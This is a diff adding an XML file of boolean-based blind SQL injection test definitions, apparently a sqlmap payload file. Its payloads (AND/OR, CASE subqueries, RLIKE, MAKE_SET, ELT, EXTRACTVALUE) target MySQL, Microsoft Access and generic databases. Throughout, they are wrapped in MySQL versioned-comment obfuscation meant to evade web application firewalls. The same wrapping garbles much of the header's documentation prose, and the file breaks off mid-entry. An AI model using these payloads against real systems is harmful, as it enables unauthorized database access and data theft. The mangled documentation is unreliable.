@@ -1,0 +1,1612 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!--
+Tag: <test>
+    SQL injection test definition.
+
+    Sub-tag: <title>
+        Title of the test.
+
+    Sub-tag: <stype>
+        SQL injection family type.
+
+        Valid values:
+            1: Boolean-based blind SQL injection
+            2: Error-based queries SQL injection
+            3: Inline queries SQL injection
+            4: Stacked queries SQL injection
+            5: Time-based blind SQL injection
+            6: UNION query SQL injection
+
+    Sub-tag: <level>
+        From which level check for this test.
+
+        Valid values:
+            1: Always (<100 requests)
+            2: Try a bit harder (100-200 requests)
+            3: Good number of requests (200-500 requests)
+            4: Extensive test (500-1000 requests)
+            5: You have plenty of time (>1000 requests)
+
+    Sub-tag: <risk>
+        Likelihood of a payload to damage the data integrity.
+
+        Valid values:
+            1: Low risk
+            2: Medium risk
+            3: High risk
+
+    Sub-tag: <clause>
+        In which clause the payload can work.
+
+        NOTE: for instance, there are some payload that do not have to be
+        tested as soon as it has been identified whether or not the
+        injection is within a WHERE clause condition.
+
+        Valid values:
+            0: Always
+            1: WHERE / HAVING
+            2: GROUP BY
+            3: ORDER BY
+            4: LIMIT
+            5: OFFSET
+            6: TOP
+            7: Table name
+            8: Column name
+            9: Pre-WHERE (non-query)
+
+        A comma separated list of these values is also possible.
+
+    Sub-tag: <where>
+        Where to add our '<prefix> <payload></*!50000comment>/**_**/*/ </*!50000suffix>'/**_**/*/ /*!50000string./**_**/*/
+
+        /*!50000Valid/**_**/*/ /*!50000values:/**_**/*/
+            /*!500001:/**_**/*/ /*!50000Append/**_**/*/ /*!50000the/**_**/*/ /*!50000string/**_**/*/ /*!50000to/**_**/*/ /*!50000the/**_**/*/ /*!50000parameter/**_**/*/ /*!50000original/**_**/*/ /*!50000value/**_**/*/
+            /*!500002:/**_**/*/ /*!50000Replace/**_**/*/ /*!50000the/**_**/*/ /*!50000parameter/**_**/*/ /*!50000original/**_**/*/ /*!50000value/**_**/*/ /*!50000with/**_**/*/ /*!50000a/**_**/*/ /*!50000negative/**_**/*/ /*!50000random/**_**/*/
+               /*!50000integer/**_**/*/ /*!50000value/**_**/*/ /*!50000and/**_**/*/ /*!50000append/**_**/*/ /*!50000our/**_**/*/ /*!50000string/**_**/*/
+            /*!500003:/**_**/*/ /*!50000Replace/**_**/*/ /*!50000the/**_**/*/ /*!50000parameter/**_**/*/ /*!50000original/**_**/*/ /*!50000value/**_**/*/ /*!50000with/**_**/*/ /*!50000our/**_**/*/ /*!50000string/**_**/*/
+
+    /*!50000Sub-tag:/**_**/*/ </*!50000vector>/**_**/*/
+        /*!50000The/**_**/*/ /*!50000payload/**_**/*/ /*!50000that/**_**/*/ /*!50000will/**_**/*/ /*!50000be/**_**/*/ /*!50000used/**_**/*/ /*!50000to/**_**/*/ /*!50000exploit/**_**/*/ /*!50000the/**_**/*/ /*!50000injection/**_**/*/ /*!50000point./**_**/*/
+
+    /*!50000Sub-tag:/**_**/*/ </*!50000request>/**_**/*/
+        /*!50000What/**_**/*/ /*!50000to/**_**/*/ /*!50000inject/**_**/*/ /*!50000for/**_**/*/ /*!50000this/**_**/*/ /*!50000test./**_**/*/
+
+        /*!50000Sub-tag:/**_**/*/ </*!50000payload>/**_**/*/
+            /*!50000The/**_**/*/ /*!50000payload/**_**/*/ /*!50000to/**_**/*/ /*!50000test/**_**/*/ /*!50000for./**_**/*/
+
+        /*!50000Sub-tag:/**_**/*/ </*!50000comment>/**_**/*/
+            /*!50000Comment/**_**/*/ /*!50000to/**_**/*/ /*!50000append/**_**/*/ /*!50000to/**_**/*/ /*!50000the/**_**/*/ /*!50000payload,/**_**/*/ /*!50000before/**_**/*/ /*!50000the/**_**/*/ /*!50000suffix./**_**/*/
+
+        /*!50000Sub-tag:/**_**/*/ </*!50000char>/**_**/*/
+            /*!50000Character/**_**/*/ /*!50000to/**_**/*/ /*!50000use/**_**/*/ /*!50000to/**_**/*/ /*!50000bruteforce/**_**/*/ /*!50000number/**_**/*/ /*!50000of/**_**/*/ /*!50000columns/**_**/*/ /*!50000in/**_**/*/ /*!50000UNION/**_**/*/
+            /*!50000query/**_**/*/ /*!50000SQL/**_**/*/ /*!50000injection/**_**/*/ /*!50000tests./**_**/*/
+
+        /*!50000Sub-tag:/**_**/*/ </*!50000columns>/**_**/*/
+            /*!50000Range/**_**/*/ /*!50000of/**_**/*/ /*!50000columns/**_**/*/ /*!50000to/**_**/*/ /*!50000test/**_**/*/ /*!50000for/**_**/*/ /*!50000in/**_**/*/ /*!50000UNION/**_**/*/ /*!50000query/**_**/*/ /*!50000SQL/**_**/*/ /*!50000injection/**_**/*/
+            /*!50000tests./**_**/*/
+
+    /*!50000Sub-tag:/**_**/*/ </*!50000response>/**_**/*/
+        /*!50000How/**_**/*/ /*!50000to/**_**/*/ /*!50000identify/**_**/*/ /*!50000if/**_**/*/ /*!50000the/**_**/*/ /*!50000injected/**_**/*/ /*!50000payload/**_**/*/ /*!50000succeeded./**_**/*/
+
+        /*!50000Sub-tag:/**_**/*/ </*!50000comparison>/**_**/*/
+            /*!50000Perform/**_**/*/ /*!50000a/**_**/*/ /*!50000request/**_**/*/ /*!50000with/**_**/*/ /*!50000this/**_**/*/ /*!50000string/**_**/*/ /*!50000as/**_**/*/ /*!50000the/**_**/*/ /*!50000payload/**_**/*/ /*!50000and/**_**/*/ /*!50000compare/**_**/*/
+            /*!50000the/**_**/*/ /*!50000response/**_**/*/ /*!50000with/**_**/*/ /*!50000the/**_**/*/ </*!50000payload>/**_**/*/ /*!50000response./**_**/*/ /*!50000Apply/**_**/*/ /*!50000the/**_**/*/ /*!50000comparison/**_**/*/
+            /*!50000algorithm./**_**/*/
+
+            /*!50000NOTE:/**_**/*/ /*!50000useful/**_**/*/ /*!50000to/**_**/*/ /*!50000test/**_**/*/ /*!50000for/**_**/*/ /*!50000boolean-based/**_**/*/ /*!50000blind/**_**/*/ /*!50000SQL/**_**/*/ /*!50000injections./**_**/*/
+
+        /*!50000Sub-tag:/**_**/*/ </*!50000grep>/**_**/*/
+            /*!50000Regular/**_**/*/ /*!50000expression/**_**/*/ /*!50000to/**_**/*/ /*!50000grep/**_**/*/ /*!50000for/**_**/*/ /*!50000in/**_**/*/ /*!50000the/**_**/*/ /*!50000response/**_**/*/ /*!50000body./**_**/*/
+
+            /*!50000NOTE:/**_**/*/ /*!50000useful/**_**/*/ /*!50000to/**_**/*/ /*!50000test/**_**/*/ /*!50000for/**_**/*/ /*!50000error-based/**_**/*/ /*!50000SQL/**_**/*/ /*!50000injection./**_**/*/
+
+        /*!50000Sub-tag:/**_**/*/ </*!50000time>/**_**/*/
+            /*!50000Time/**_**/*/ /*!50000in/**_**/*/ /*!50000seconds/**_**/*/ /*!50000to/**_**/*/ /*!50000wait/**_**/*/ /*!50000before/**_**/*/ /*!50000the/**_**/*/ /*!50000response/**_**/*/ /*!50000is/**_**/*/ /*!50000returned./**_**/*/
+
+            /*!50000NOTE:/**_**/*/ /*!50000useful/**_**/*/ /*!50000to/**_**/*/ /*!50000test/**_**/*/ /*!50000for/**_**/*/ /*!50000time-based/**_**/*/ /*!50000blind/**_**/*/ /*!50000and/**_**/*/ /*!50000stacked/**_**/*/ /*!50000queries/**_**/*/
+            /*!50000SQL/**_**/*/ /*!50000injections./**_**/*/
+
+        /*!50000Sub-tag:/**_**/*/ </*!50000union>/**_**/*/
+            /*!50000Calls/**_**/*/ /*!50000unionTest()/**_**/*/ /*!50000function./**_**/*/
+
+            /*!50000NOTE:/**_**/*/ /*!50000useful/**_**/*/ /*!50000to/**_**/*/ /*!50000test/**_**/*/ /*!50000for/**_**/*/ /*!50000UNION/**_**/*/ /*!50000query/**_**/*/ (/*!50000inband)/**_**/*/ /*!50000SQL/**_**/*/ /*!50000injection./**_**/*/
+
+    /*!50000Sub-tag:/**_**/*/ </*!50000details>/**_**/*/
+        /*!50000Which/**_**/*/ /*!50000details/**_**/*/ /*!50000can/**_**/*/ /*!50000be/**_**/*/ /*!50000infered/**_**/*/ /*!50000if/**_**/*/ /*!50000the/**_**/*/ /*!50000payload/**_**/*/ /*!50000succeed./**_**/*/
+
+        /*!50000Sub-tags:/**_**/*/ </*!50000dbms>/**_**/*/
+            /*!50000What/**_**/*/ /*!50000is/**_**/*/ /*!50000the/**_**/*/ /*!50000database/**_**/*/ /*!50000management/**_**/*/ /*!50000system/**_**/*/ (/*!50000e.g./**_**/*/ /*!50000MySQL)./**_**/*/
+
+        /*!50000Sub-tags:/**_**/*/ </*!50000dbms_version>/**_**/*/
+            /*!50000What/**_**/*/ /*!50000is/**_**/*/ /*!50000the/**_**/*/ /*!50000database/**_**/*/ /*!50000management/**_**/*/ /*!50000system/**_**/*/ /*!50000version/**_**/*/ (/*!50000e.g./**_**/*/ /*!500005.0.51)./**_**/*/
+
+        /*!50000Sub-tags:/**_**/*/ </*!50000os>/**_**/*/
+            /*!50000What/**_**/*/ /*!50000is/**_**/*/ /*!50000the/**_**/*/ /*!50000database/**_**/*/ /*!50000management/**_**/*/ /*!50000system/**_**/*/ /*!50000underlying/**_**/*/ /*!50000operating/**_**/*/
+            /*!50000system./**_**/*/
+
+    </*!50000test>/**_**/*/
+        </*!50000title></title>/**_**/*/
+        </*!50000stype></stype>/**_**/*/
+        </*!50000level></level>/**_**/*/
+        </*!50000risk></risk>/**_**/*/
+        </*!50000clause></clause>/**_**/*/
+        </*!50000where></where>/**_**/*/
+        </*!50000vector></vector>/**_**/*/
+        </*!50000request>/**_**/*/
+            </*!50000payload>/**_**/*/</payload>
+            <comment></comment>
+            <char></char>
+            <columns></columns>
+        </request>
+        <response>
+            <comparison></comparison>
+            <grep></grep>
+            <time></time>
+            <union></union>
+        </response>
+        <details>
+            <dbms></dbms>
+            <dbms_version></dbms_version>
+            <os></os>
+        </details>
+    </test>
+-->
+
+<root>
+    <!-- Boolean-based blind tests - WHERE/HAVING clause -->
+    <test>
+        <title>AND boolean-based blind - WHERE or HAVING clause</title>
+        <stype>1</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>/*!50000AND/**_**/*/ /*!50000[/*!50000INFERENCE]/**_**/*//**_**/*/</vector>
+        <request>
+            <payload>/*!50000AND/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*//**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000AND/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*//**_**/*/</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>OR boolean-based blind - WHERE or HAVING clause</title>
+        <stype>1</stype>
+        <level>1</level>
+        <risk>3</risk>
+        <clause>1,9</clause>
+        <where>2</where>
+        <vector>/*!50000OR/**_**/*/ /*!50000[/*!50000INFERENCE]/**_**/*//**_**/*/</vector>
+        <request>
+            <payload>/*!50000OR/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*//**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000OR/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*//**_**/*/</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>OR boolean-based blind - WHERE or HAVING clause (NOT)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,9</clause>
+        <where>1</where>
+        <vector>/*!50000OR/**_**/*/ /*!50000NOT/**_**/*/ /*!50000[/*!50000INFERENCE]/**_**/*//**_**/*/</vector>
+        <request>
+            <payload>/*!50000OR/**_**/*/ /*!50000NOT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*//**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000OR/**_**/*/ /*!50000NOT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*//**_**/*/</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>AND boolean-based blind - WHERE or HAVING clause (subquery - comment)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>/*!50000AND/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=(SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ (/*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM2]/**_**/*/)/**_**/*/ /*!50000END))/**_**/*/</vector>
+        <request>
+            <payload>/*!50000AND/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=(SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ (/*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM2]/**_**/*/)/**_**/*/ /*!50000END))/**_**/*/</payload>
+            <comment>/*!50000[/*!50000GENERIC_SQL_COMMENT]/**_**/*//**_**/*/</comment>
+        </request>
+        <response>
+            <comparison>/*!50000AND/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=(SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ (/*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM2]/**_**/*/)/**_**/*/ /*!50000END))/**_**/*/</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>OR boolean-based blind - WHERE or HAVING clause (subquery - comment)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1,9</clause>
+        <where>2</where>
+        <vector>/*!50000OR/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=(SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ (/*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM2]/**_**/*/)/**_**/*/ /*!50000END))/**_**/*/</vector>
+        <request>
+            <payload>/*!50000OR/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=(SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ (/*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM2]/**_**/*/)/**_**/*/ /*!50000END))/**_**/*/</payload>
+            <comment>/*!50000[/*!50000GENERIC_SQL_COMMENT]/**_**/*//**_**/*/</comment>
+        </request>
+        <response>
+            <comparison>/*!50000OR/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=(SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ (/*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM2]/**_**/*/)/**_**/*/ /*!50000END))/**_**/*/</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>AND boolean-based blind - WHERE or HAVING clause (comment)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>/*!50000AND/**_**/*/ /*!50000[/*!50000INFERENCE]/**_**/*//**_**/*/</vector>
+        <request>
+            <payload>/*!50000AND/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*//**_**/*/</payload>
+            <comment>/*!50000[/*!50000GENERIC_SQL_COMMENT]/**_**/*//**_**/*/</comment>
+        </request>
+        <response>
+            <comparison>/*!50000AND/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*//**_**/*/</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>OR boolean-based blind - WHERE or HAVING clause (comment)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>/*!50000OR/**_**/*/ /*!50000[/*!50000INFERENCE]/**_**/*//**_**/*/</vector>
+        <request>
+            <payload>/*!50000OR/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*//**_**/*/</payload>
+            <comment>/*!50000[/*!50000GENERIC_SQL_COMMENT]/**_**/*//**_**/*/</comment>
+        </request>
+        <response>
+            <comparison>/*!50000OR/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*//**_**/*/</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>OR boolean-based blind - WHERE or HAVING clause (NOT - comment)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>/*!50000OR/**_**/*/ /*!50000NOT/**_**/*/ /*!50000[/*!50000INFERENCE]/**_**/*//**_**/*/</vector>
+        <request>
+            <payload>/*!50000OR/**_**/*/ /*!50000NOT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*//**_**/*/</payload>
+            <comment>/*!50000[/*!50000GENERIC_SQL_COMMENT]/**_**/*//**_**/*/</comment>
+        </request>
+        <response>
+            <comparison>/*!50000OR/**_**/*/ /*!50000NOT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*//**_**/*/</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>AND boolean-based blind - WHERE or HAVING clause (MySQL comment)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>/*!50000AND/**_**/*/ /*!50000[/*!50000INFERENCE]/**_**/*//**_**/*/</vector>
+        <request>
+            <payload>/*!50000AND/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*//**_**/*/</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <comparison>/*!50000AND/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*//**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>/*!50000OR/**_**/*/ /*!50000[/*!50000INFERENCE]/**_**/*//**_**/*/</vector>
+        <request>
+            <payload>/*!50000OR/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*//**_**/*/</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <comparison>/*!50000OR/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*//**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>/*!50000OR/**_**/*/ /*!50000NOT/**_**/*/ /*!50000[/*!50000INFERENCE]/**_**/*//**_**/*/</vector>
+        <request>
+            <payload>/*!50000OR/**_**/*/ /*!50000NOT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*//**_**/*/</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <comparison>/*!50000OR/**_**/*/ /*!50000NOT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*//**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>/*!50000AND/**_**/*/ /*!50000[/*!50000INFERENCE]/**_**/*//**_**/*/</vector>
+        <request>
+            <payload>/*!50000AND/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*//**_**/*/</payload>
+            <comment>%/*!5000016/**_**/*/</comment>
+        </request>
+        <response>
+            <comparison>/*!50000AND/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*//**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft Access</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>/*!50000OR/**_**/*/ /*!50000[/*!50000INFERENCE]/**_**/*//**_**/*/</vector>
+        <request>
+            <payload>/*!50000OR/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*//**_**/*/</payload>
+            <comment>%/*!5000016/**_**/*/</comment>
+        </request>
+        <response>
+            <comparison>/*!50000OR/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*//**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft Access</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>/*!50000RLIKE/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500000x28/**_**/*/ /*!50000END))/**_**/*/</vector>
+        <request>
+            <payload>/*!50000RLIKE/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500000x28/**_**/*/ /*!50000END))/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000RLIKE/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500000x28/**_**/*/ /*!50000END))/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>1</where>
+        <vector>/*!50000AND/**_**/*/ /*!50000MAKE_SET(/*!50000[INFERENCE]/**_**/*/,/*!50000[RANDNUM]/**_**/*/)/**_**/*/</vector>
+        <request>
+            <payload>/*!50000AND/**_**/*/ /*!50000MAKE_SET(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM1]/**_**/*/)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000AND/**_**/*/ /*!50000MAKE_SET(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/,/*!50000[RANDNUM1]/**_**/*/)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,2,3</clause>
+        <where>2</where>
+        <vector>/*!50000OR/**_**/*/ /*!50000MAKE_SET(/*!50000[INFERENCE]/**_**/*/,/*!50000[RANDNUM]/**_**/*/)/**_**/*/</vector>
+        <request>
+            <payload>/*!50000OR/**_**/*/ /*!50000MAKE_SET(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM1]/**_**/*/)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000OR/**_**/*/ /*!50000MAKE_SET(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/,/*!50000[RANDNUM1]/**_**/*/)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>1</where>
+        <vector>/*!50000AND/**_**/*/ /*!50000ELT(/*!50000[INFERENCE]/**_**/*/,/*!50000[RANDNUM]/**_**/*/)/**_**/*/</vector>
+        <request>
+            <payload>/*!50000AND/**_**/*/ /*!50000ELT(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM1]/**_**/*/)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000AND/**_**/*/ /*!50000ELT(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/,/*!50000[RANDNUM1]/**_**/*/)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1,2,3</clause>
+        <where>2</where>
+        <vector>/*!50000OR/**_**/*/ /*!50000ELT(/*!50000[INFERENCE]/**_**/*/,/*!50000[RANDNUM]/**_**/*/)/**_**/*/</vector>
+        <request>
+            <payload>/*!50000OR/**_**/*/ /*!50000ELT(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM1]/**_**/*/)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000OR/**_**/*/ /*!50000ELT(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/,/*!50000[RANDNUM1]/**_**/*/)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>1</where>
+        <vector>/*!50000AND/**_**/*/ /*!50000EXTRACTVALUE(/*!50000[RANDNUM]/**_**/*/,CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500000x3A/**_**/*/ /*!50000END)/**_**/*/</vector>
+        <request>
